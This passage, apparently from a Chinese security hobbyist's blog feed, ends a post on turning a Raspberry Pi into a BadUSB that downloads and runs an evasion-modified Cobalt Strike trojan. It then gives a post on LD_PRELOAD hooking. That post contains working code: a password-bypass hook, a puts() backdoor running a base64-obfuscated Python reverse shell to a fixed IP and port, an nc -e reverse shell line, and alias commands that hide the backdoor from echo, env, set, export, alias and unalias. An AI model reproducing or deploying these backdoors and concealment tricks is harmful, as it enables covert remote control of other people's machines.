<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">layout</span>(<span class="string">&#x27;us&#x27;</span>); <span class="comment">//键盘布局，这里运行脚本时一定要切成英文的输入法，最好用成美式键盘，不然可能会输出中文导致命令错误</span></span><br><span class="line"><span class="title function_">typingSpeed</span>(标准间隔,随机值); <span class="comment">//ms为单位，标准间隔是每个字符敲击的间隔，随机值是敲击每个字符所落下的时间</span></span><br><span class="line"><span class="title function_">delay</span>(time); <span class="comment">//ms为单位，等待时间</span></span><br><span class="line"><span class="title function_">type</span>(<span class="string">&#x27;xxxxx\n&#x27;</span>); <span class="comment">//输入字符串，模拟键盘敲击按键</span></span><br><span class="line"><span class="title function_">press</span>(<span class="string">&#x27;GUI r&#x27;</span>); <span class="comment">//按下按键再松开 ，这个按的是windows+r键</span></span><br></pre></td></tr></table></figure>



<p>编写一段代码，用 <code>powershell</code> 来打开记事本，并写下几个字符串试试</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">layout</span>(<span class="string">&#x27;us&#x27;</span>);</span><br><span class="line"><span class="title function_">typingSpeed</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="title function_">press</span>(<span class="string">&#x27;GUI r&#x27;</span>);</span><br><span class="line"><span class="title function_">delay</span>(<span class="number">500</span>);</span><br><span class="line"><span class="title function_">type</span>(<span class="string">&#x27;notepad\n&#x27;</span>);</span><br><span class="line"><span class="title function_">delay</span>(<span class="number">800</span>);</span><br><span class="line"><span class="title function_">type</span>(<span class="string">&#x27;hello world\nit is test!\n&#x27;</span>);</span><br><span class="line"><span class="title function_">type</span>(<span class="string">&quot;it&#x27;s cool!\n&quot;</span>);</span><br></pre></td></tr></table></figure>



<p>确实全程自动输入指定内容（注意：最好用成美式键盘，别忘记 <code>\n</code> 来模拟敲击回车）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310131222369.png" alt="image-20231012161126193"></p>
<p>整个的过程也可以遥控，就是将树莓派插到主机 <code>A</code> 中，然后用另一台设备（手机也可以）连接树莓派的热点，来运行编写好的  <code>HIDScript</code> ，这样主机 <code>A</code> 的鼠标和键盘就可以自己动了</p>
<h3 id="HIDScript-执行始终处于-Running-jobs问题"><a href="#HIDScript-执行始终处于-Running-jobs问题" class="headerlink" title="HIDScript 执行始终处于 Running jobs问题"></a>HIDScript 执行始终处于 Running jobs问题</h3><p>注意：我开始做的时候，点击 <code>RUN</code> 是无法成功执行 <code>HIDScript</code> 的，会始终处于 <code>Running jobs</code> 状态（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310121619986.png" alt="image-20231012161904822"></p>
<p>折腾了两天，并查阅资料，无果。并且在 <code>github</code> 的项目上有相关的 <a href="https://github.com/RoganDawes/P4wnP1_aloa/issues/206">Issues</a> ，阅读之后也没发现到底是哪出了问题。最终我找同学借了六根 <code>USB</code> 数据线，逐一试过后，惊喜的发现有一根插上后运行 <code>HIDScript</code> 成功，其余五根均失败。这六根线都是可以传输数据和充电的，如此确定是数据线的某些未知原因导致的 <code>HIDScript</code> 执行是卡住（应该就是数据没传给主机）</p>
<h2 id="Badusb-远控木马"><a href="#Badusb-远控木马" class="headerlink" title="Badusb + 远控木马"></a>Badusb + 远控木马</h2><p>为了当一把黑客小子😎，我打算一不做二不休，最终想实现这个树莓派插入一台电脑，就能直接对其进行控制（只是找同学的电脑进行学习测试😆）</p>
<p>思路：我选择用 <code>Cobalt Strike</code> （下文简称 <code>CS</code>）来生成一个远控木马（并找红队大哥做了下免杀…），然后将木马上传至自己的服务器，通过直接访问链接就可以进行下载。最后用 <strong>badusb</strong> 模拟键盘输入，执行下载木马的命令</p>
<p><code>CS</code> 分为服务端和客户端，如果自己没有服务器的话，就只能把客户端和服务端部署在同一个局域网里，同一局域网的肉鸡上线后，通过服务端的转发，来实现客户端对其间接控制。如果有服务器的话，那服务端就可以部署到公网中，即使肉鸡和客户端处于两个不同局域网中，客户端依然可以通过服务端的转发，实现间接控制（前提是客户端和肉鸡都能上网😅）</p>
<p>利用 <code>nginx</code> 将服务器上的静态文件（恶意木马）通过 <code>HTTP</code> 协议展现给客户端，以便于用户直接下载。我是先安装了 <code>nginx</code> ，然后把几个恶意程序都放到了 <code>/var/www/html</code> 目录下，然后启动 <code>nginx</code> 服务。写一个测试文件，看下效果。这里在 <code>/var/www/html</code> 目录下放的是一个文本文件，通过 <code>ip + port</code> 直接访问这个文件就能查看到（如下图），如果是 <code>exe</code> 文件的话，访问其路径会自动下载文件。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310130945972.png" alt="image-20231013094534872"></p>
<p>攻击的完整过程如下图，至于为什么不能让 <strong>badusb</strong> 插入后直接执行下载木马的命令，这是因为做完免杀后，实际上要下载三个文件。如果都写到 <code>HIDScript</code> 里的话，<strong>badusb</strong> 模拟键盘输入会出现错误，字符会乱序并且重复打印（具体原因不知道，经过测试姑且猜测是脚本太长了），为了缩短命令，我就做了一个启动脚本，真正下载木马并执行写在了启动脚本里。而 <strong>badusb</strong> 只需要下载启动脚本并执行即可</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310131121410.png" alt="image-20231013112141288"></p>
<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>最终攻击效果在文章开头已经展示了，这个过程总的来说确实叫玩，这算是真正体验了一把黑客小子的感觉，并且学习到了一些新知识。但目前我并不打算再花费更多的时间继续去研究这个黑客小工具了，它对于学习的帮助至此就够了，再花时间就纯属于为了装逼而研究🥱。本想学习树莓派来对后面硬件的拆解和焊接打一点基础，但没想到歪打正着当了把黑客小子，学习之余装了一把🤠</p>
<p>当然了，也许以后我想玩<del>想装逼</del>的时候，可能还会折腾点新花样出来，哈哈QAQ</p>
<p>最后就是感谢一下红队大哥 <strong>邓阮叶</strong> 写的免杀（大佬都喜欢低调，就不挂大哥的链接了😎），还有我的全能室友 <a href="https://www.cnblogs.com/jxdgx/">jxdgx</a> 帮忙剪辑的攻击效果视频（加的蒙版是真炫嗷）</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://github.com/RoganDawes/P4wnP1_aloa#1-features">https://github.com/RoganDawes/P4wnP1_aloa#1-features</a></p>
<p><a href="https://www.cnblogs.com/azureology/p/12343267.html">树莓派zero w入坑指南 - azureology - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.bilibili.com/video/BV1dy4y1C7wb/?spm_id_from=333.880.my_history.page.click&vd_source=bea0e85c91c884d3a927e3c65f2f60df">如何让树莓派变成黑客工具_哔哩哔哩_bilibili</a></p>
<p><a href="https://houwenda.github.io/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/">如何用P4wnP1_aloa进行HID攻击 | 漏断’s Blog (houwenda.github.io)</a></p>
<p><a href="https://www.ascotbe.com/2019/06/29/raspberry/">P4wnP1全家桶安装及实战 | ascotbe</a></p>
<p><a href="https://blog.csdn.net/qq_43341224/article/details/109958459">Cobalt Strike基础操作_cobaltstrike截图后存放-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/weixin_44268918/article/details/128857998">Cobalt Strike工具安装与基础使用_cobalt strike下载_剁椒鱼头没剁椒的博客-CSDN博客</a></p>
]]></content>
      <categories>
        <category>树莓派</category>
        <category>探究</category>
      </categories>
      <tags>
        <tag>黑客小子</tag>
        <tag>木马</tag>
      </tags>
  </entry>
  <entry>
    <title>关于环境变量LD_PRELOAD的利用</title>
    <url>/posts/af0595fa.html</url>
    <content><![CDATA[<h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p><code>LD_PRELOAD</code> 是 <code>Linux</code> 系统的一个环境变量，它允许运行程序时优先强制加载指定的动态链接库，并且由于 <strong>全局符号介入机制</strong> 的影响，<code>LD_PRELOAD</code> 指定的动态链接库中的函数会<strong>覆盖之后其他动态链接库中的同名函数</strong>。对于调试程序或者向程序中注入自定义的代码都是很方便的，本文记录了如何通过 <code>LD_PRELOAD</code> 环境变量来 <code>hook</code> 程序，达到植入后门和调试的目的</p>
<span id="more"></span>



<h3 id="全局符号介入"><a href="#全局符号介入" class="headerlink" title="全局符号介入"></a>全局符号介入</h3><p>全局符号介入指的是程序调用动态库中的函数时，如果调用的函数在多个动态库中都存在，那么链接器只会保留第一个链接的动态库中的函数，忽略之后同名的函数，所以只要预加载的全局符号中有和后加载的普通共享库中全局符号重名，那么就会覆盖后装载的共享库以及目标文件里的全局符号。</p>
<h3 id="实验-DIY库函数"><a href="#实验-DIY库函数" class="headerlink" title="实验-DIY库函数"></a>实验-DIY库函数</h3><p>下面通过一个实验来体会用 <code>LD_PRELOAD</code> 替换 <code>libc</code> 中的库函数</p>
<p>这是 <code>test</code> 程序正常依赖的动态库<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309251303304.png" alt="image-20230925130338187"></p>
<p>下面是使用 <code>LD_PRELOAD</code> 加载了一个动态库的状态，能够发现 <code>test</code> 程序依赖的动态库多了一个 <code>hook.so</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309272033889.png"></p>
<p>补充：也可以使用 <code>export</code> 设置环境变量，在当前 <code>shell</code> 会话及子进程中都是有效的，命令如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export LD_PRELOAD=/home/zikh/Desktop/hook.so</span><br><span class="line">./test</span><br></pre></td></tr></table></figure>





<p>下面通过一个程序用 <code>LD_PRELOAD</code> 来 <code>DIY</code> 一下动态库里的 <code>strncmp</code> 函数，主程序代码如下，实现了一个类似于 <code>shell</code> 的场景，只有 <code>su</code> <code>exit</code> 两个功能 ，正常情况下只有输入正确的 <code>password</code> 才能通过检查，输出 <code>ROOT!</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc test.c -o test -w</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        setvbuf(<span class="built_in">stdin</span>,  <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stderr</span>,  <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">        <span class="type">char</span> passwd[<span class="number">0x20</span>];</span><br><span class="line">        init();</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *password=<span class="string">&quot;zikh26&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;-&gt; Desktop &quot;</span>);</span><br><span class="line">                read(<span class="number">0</span>,buf,<span class="number">0x20</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(<span class="string">&quot;exit&quot;</span>,buf,<span class="number">4</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(<span class="string">&quot;su&quot;</span>,buf,<span class="number">2</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Password: &quot;</span>);</span><br><span class="line">                        read(<span class="number">0</span>,passwd,<span class="number">0x20</span>);</span><br><span class="line">                        <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(password,passwd,<span class="built_in">strlen</span>(password)))</span><br><span class="line">                        &#123;</span><br><span class="line">                                <span class="built_in">puts</span>(<span class="string">&quot;ROOT!&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>再写一个 <code>hook.c</code> 文件，自定义了一个 <code>strncmp</code> 函数，用来判断两个字符串在 <code>len</code> 字节之前的部分是否一样，但它和动态库原本 <code>strncmp</code> 函数不同的地方在于可以被 <code>\x00</code>  截断</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc hook.c -o hook.so -shared -fPIC -w</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">strncmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s1,<span class="type">const</span> <span class="type">char</span> *s2,<span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(*s1==<span class="number">0</span> || *s2==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(*s1!=*s2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s1++;</span><br><span class="line">        s2++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;               </span><br></pre></td></tr></table></figure>



<p>为了确保程序运行时确实调用的是自定义的 <code>strncmp</code> 函数，我选择重新加上 <code>-g</code> 参数，重新编译一下 <code>hook.so</code> ，执行 <code>gdb --args env LD_PRELOAD=/home/zikh/Desktop/hook.so ./test</code> 进行调试，执行到 <code>strncmp</code> 时可以看到确实是执行了我们自定义的函数（不知道为什么，这样无法像 <code>b main</code> 这样来通过符号下断点了）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309261030749.png" alt="image-20230926103045471" style="zoom:50%;" />



<p>下面是正常运行 <code>test</code> 程序和加载 <code>hook.so</code> 后再运行 <code>test</code> 的两种情况</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309261013829.png" alt="image-20230926101305744"></p>
<p>这样来看的话，加载的 <code>hook.so</code> 中的 <code>strncmp</code> 函数也可以正常发挥，程序依然运行的没有任何问题</p>
<p>现编写如下的攻击脚本</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">binary_path = <span class="string">&quot;./test&quot;</span></span><br><span class="line">ld_preload_path = <span class="string">&quot;/home/zikh/Desktop/hook.so&quot;</span></span><br><span class="line">p = process(binary_path, env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>: ld_preload_path&#125;)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">&#x27;su&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">&quot;\x00&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309261017045.png" alt="image-20230926101701941"></p>
<p>在输入密码时，发送一个 <code>\x00</code> 就能截断自定义的 <code>strncmp</code> 函数，从而实现绕过对密码的检查</p>
<p>上面的实验 <code>DIY</code> 了库函数 <code>strncmp</code> ，并且故意写了一个有漏洞自定义函数，算是玩了一下。同理，<code>Linux</code> 下的有些命令本质上也是可执行程序且动态链接，以 <code>whoami</code> 命令为例，能看到它也是正常依赖的 <code>libc</code> 库</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309280917924.png" alt="image-20230928091754782"></p>
<p>用 <code>ltrace</code> 命令来查看 <code>whoami</code> 调用了哪些函数，其中发现了 <code>puts</code> 函数被执行，所以我们可以通过劫持动态库中的 <code>puts</code> 函数，让其先执行我们自定义的代码，再去执行原本正常的 <code>puts</code> 函数，这样就可以做到神不知鬼不觉植入一个后门</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309280918556.png" alt="image-20230928091803468"></p>
<h3 id="植入后门"><a href="#植入后门" class="headerlink" title="植入后门"></a>植入后门</h3><p>下面的代码就是先记录一下 <code>puts</code> 函数的 <code>libc</code> 地址，因为伴随着劫持 <code>puts</code> 函数，无法通过函数名直接来执行，必须借助函数指针来调用动态库原本的 <code>puts</code> 函数。在此之前执行一个反弹 <code>shell</code> ，这里之所以选择用 <code>python</code> 的原因是 <code>nc 10.214.140.181 4444 -e /bin/bash</code> 这样会阻塞住 <code>shell</code> </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc preload.c -o preload.so -ldl -shared -fPIC  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __USE_GNU</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">puts</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *message)</span> &#123;</span><br><span class="line">  <span class="type">int</span> (*new_puts)(<span class="type">const</span> <span class="type">char</span> *message);</span><br><span class="line">  <span class="type">int</span> result;</span><br><span class="line">  new_puts = dlsym(RTLD_NEXT, <span class="string">&quot;puts&quot;</span>);</span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;python3 -c \&quot;import base64,sys;exec(base64.b64decode(&#123;2:str,3:lambda b:bytes(b,&#x27;UTF-8&#x27;)&#125;[sys.version_info[0]](&#x27;aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgcmV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiMTkyLjE2OC4xMTAuMjA1IiwgNDQ0NCkpCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAwKQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMSkKICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDIpCiAgICAgICAgcCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCAiLWkiXSkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBleGl0KCk=&#x27;)))\&quot;&quot;</span>);</span><br><span class="line">  <span class="comment">//system(&quot;nc 10.214.140.181 4444 -e /bin/bash&quot;);</span></span><br><span class="line">  result = new_puts(message);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>python</code> 那部分 <code>base64</code> 解码的代码如下，之所以编码一下的原因可能是两个？ <del>免杀?</del> <del>方便？一行命令就完事？</del> </p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os,socket,subprocess;</span><br><span class="line">ret = os.fork()</span><br><span class="line"><span class="keyword">if</span> ret &gt; <span class="number">0</span>:</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((<span class="string">&quot;192.168.110.205&quot;</span>, <span class="number">4444</span>))</span><br><span class="line">        os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">        os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">        os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">        p = subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-i&quot;</span>])</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>

<p>将自定义的动态库给编译出来（反弹的 <code>IP</code> 和 <code>port</code> 自行修改），执行命令 <code>export LD_PRELOAD=/home/zikh/Desktop/preload.so</code> 修改环境变量 <code>LD_PRELOAD</code> ，然后再次执行 <code>whoami</code> 命令，发现触发了后门，反弹了 <code>shell</code> 上来，并且靶机没有显示任何异常</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309280918284.png" alt="image-20230928091826195"></p>
<h3 id="隐藏痕迹"><a href="#隐藏痕迹" class="headerlink" title="隐藏痕迹"></a>隐藏痕迹</h3><p>但是如果检查环境变量 <code>LD_PRELOAD</code> 是否有值，就可以捕捉到蛛丝马迹</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309280918963.png" alt="image-20230928091831913"></p>
<p>有检查的手段，就有对抗检查的手段。隐藏痕迹的思路就是利用 <code>alias</code> 命令给能够查看环境变量的命令都定义一个别名，在输出环境变量时做一个过滤，如果检查到输出内容有自定义的动态库名称时就输出空格字符或者不输出之类的。</p>
<h4 id="隐藏echo"><a href="#隐藏echo" class="headerlink" title="隐藏echo"></a>隐藏echo</h4><p>使用 <code>alias</code> 命令将 <code>echo</code> 定义别名</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alias echo=&#x27;func()&#123; echo $* | sed &quot;s!/home/zikh/Desktop/preload.so! !g&quot;;&#125;;func&#x27;</span><br></pre></td></tr></table></figure>

<p>首先查看环境变量 <code>LD_PRELOAD</code> 是没有值的，用 <code>export</code> 进行设置后，<code>echo</code> 就能看到 <code>$LD_PRELOAD</code> 的值了，接着用 <code>alias</code> 将 <code>echo</code> 定义别名，使得 <code>echo</code> 命令输出的字符串如果包含 <code>/home/zikh/Desktop/preload.so</code> 就给替换为空格，实验效果如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309261534203.png" alt="image-20230926153414121"></p>
<p>原理如下</p>
<p>首先定义一个 <code>func</code> 函数，最后执行 <code>func</code> 函数中的内容</p>
<p><code>echo $*</code> 会输出 <code>echo</code> 命令传进来的所有参数</p>
<p><code>sed</code> 是一个非交互性文本流编辑器，<code>s</code> 参数表示替换，<code>!</code> 作为定界符（正常的分隔符是用 <code>/</code> ，但是避免路径中 <code>/</code> 的干扰，这里选择用 <code>!</code> 作为定界符），<code>g</code> 表示全局替换。</p>
<p>以 <code>sed &quot;s/abc/efg/g&quot;</code> 为例，指的是把字符串 <code>abc</code> 替换为 <code>efg</code> ，验证如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309261529607.png" alt="image-20230926152908442"></p>
<h4 id="隐藏env"><a href="#隐藏env" class="headerlink" title="隐藏env"></a>隐藏env</h4><p><code>env</code> 输出环境变量时，如果 <code>LD_PRELOAD</code> 的值并不存在，则不会输出关于这个变量的任何信息，如果给 <code>LD_PRELOAD</code> 设置值之后，就能查看到一行关于这个变量的信息（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309261549743.png" alt="image-20230926154931395"></p>
<p>这里采用的思路是用 <code>grep -v</code> 来过滤掉</p>
<p><code>grep -v</code> 指的是反转匹配</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep -v &quot;i&quot; 1.txt </span><br></pre></td></tr></table></figure>

<p>它将输出除了包含字符 <code>i</code> 这一行数据的所有内容，如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309261544099.png" alt="image-20230926154344111"></p>
<p>因此使用如下命令，将 <code>env</code> 定义别名，将除去字符串 <code>/home/zikh/Desktop/preload.so</code> 的内容都输出</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alias env=&#x27;func()&#123; env $* | grep -v &quot;/home/zikh/Desktop/preload.so&quot;;&#125;;func&#x27;</span><br></pre></td></tr></table></figure>

<p>观察下图能发现，最初 <code>env</code> 命令是成功输出了 <code>LD_PRELOAD</code> 环境变量的，但定义 <code>env</code> 别名后，再出执行 <code>env</code> 就已经看不到 <code>LD_PRELOAD</code> 环境变量了</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271226671.png" alt="image-20230927122602581"></p>
<h4 id="隐藏set"><a href="#隐藏set" class="headerlink" title="隐藏set"></a>隐藏set</h4><p>隐藏 <code>set</code> 命令输出的环境变量和 <code>env</code> 同理</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alias set=&#x27;func()&#123; set $* | grep -v &quot;/home/zikh/Desktop/preload.so&quot;;&#125;;func&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271235525.png" alt="image-20230927123517421"></p>
<h4 id="隐藏export"><a href="#隐藏export" class="headerlink" title="隐藏export"></a>隐藏export</h4><p><code>export</code> 命令的隐藏也是同理</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alias export=&#x27;func()&#123; export $* | grep -v &quot;/home/zikh/Desktop/preload.so&quot;;&#125;;func&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271236175.png" alt="image-20230927123629104"></p>
<h4 id="隐藏unalias"><a href="#隐藏unalias" class="headerlink" title="隐藏unalias"></a>隐藏unalias</h4><p>接下来是对 <code>alias</code> 和 <code>unalias</code> 命令进行处理</p>
<p>用 <code>alias</code> 可以查询到对 <code>env</code> 命令做了别名定义，对其使用 <code>unalias</code> 命令删除是可以成功的，如果没有别名的话，用 <code>unalias</code> 删除时应该是报错 <code>no such hash table element: xxx</code>（实验机器为 <code>ubuntu18.04</code>，不同版本的机器上这个错误信息可能不一样）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202309271244842.png" alt="image-20230927124444781"></p>
<p>然后对 <code>unalias</code> 命令进行一下别名定义，希望在识别到参数为 <code>env</code> <code>echo</code> <code>unalias</code> <code>export</code> <code>alias</code> <code>unalias</code> 的时候都输出报错 <code>no such hash table element: xxx</code> ，这样就造成了一种这些命令并没有被别名的假象</p>
<p><code>shell</code> 脚本如下，代码很容易理解，就是用了两个 <code>if</code> 语句确保 <code>unalias</code> 造成一种假象</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alias unalias=&#x27;func() &#123;</span><br><span class="line">  if [ $# != 0 ]; then</span><br><span class="line">    if [ $* != &quot;echo&quot; ] &amp;&amp; [ $* != &quot;env&quot; ] &amp;&amp; [ $* != &quot;set&quot; ] &amp;&amp; [ $* != &quot;export&quot; ] &amp;&amp; [ $* != &quot;alias&quot; ] &amp;&amp; [ $* != &quot;unalias&quot; ]; then</span><br><span class="line">      unalias $*</span><br><span class="line">    else</span><br><span class="line">      echo &quot;unalias: no such hash table element: $&#123;*&#125;&quot;</span><br><span class="line">    fi</span><br><span class="line">  else</span><br><span class="line">    echo &quot;unalias: not enough arguments&quot;</span><br><span class="line">  fi</span><br><span class="line">&#125;; func&#x27;</span><br></pre></td></tr></table></figure>

<p>执行 <code>alias</code> 命令如下，对 <code>unalias</code> 定义别名</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alias unalias=&#x27;func() &#123; if [ $# -ne 0 ]; then if [[ $* != &quot;echo&quot; &amp;&amp; $* != &quot;env&quot; &amp;&amp; $* != &quot;set&quot; &amp;&amp; $* != &quot;export&quot; &amp;&amp; $* != &quot;alias&quot; &amp;&amp; $* != &quot;unalias&quot; ]]; then unalias $*; else echo &quot;unalias: no such hash table element: $&#123;*&#125;&quot;; fi; else echo &quot;unalias: not enough arguments&quot;; fi &#125;; func&#x27;</span><br></pre></td></tr></table></figure>



<h4 id="隐藏alias"><a href="#隐藏alias" class="headerlink" title="隐藏alias"></a>隐藏alias</h4><p>如果用 <code>alias</code> 命令查看哪些函数定义别名的话，依然是个破绽，因此最后对 <code>alias</code> 做一个别名，伪造的方法和隐藏 <code>export</code> <code>set</code> 的输出一样，将输出有动态库名称的命令都给过滤掉，并且要额外过滤一下 <code>unalias</code> （避免被看出来 <code>unalias</code> 命令做过手脚）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">alias alias=&#x27;func()&#123; alias &quot;$@&quot; | grep -v unalias | grep -v preload.so;&#125;;func&#x27;</span><br></pre></td></tr></table></figure>



<p>汇总上面的命令，编写 <code>shell</code> 脚本如下</p>
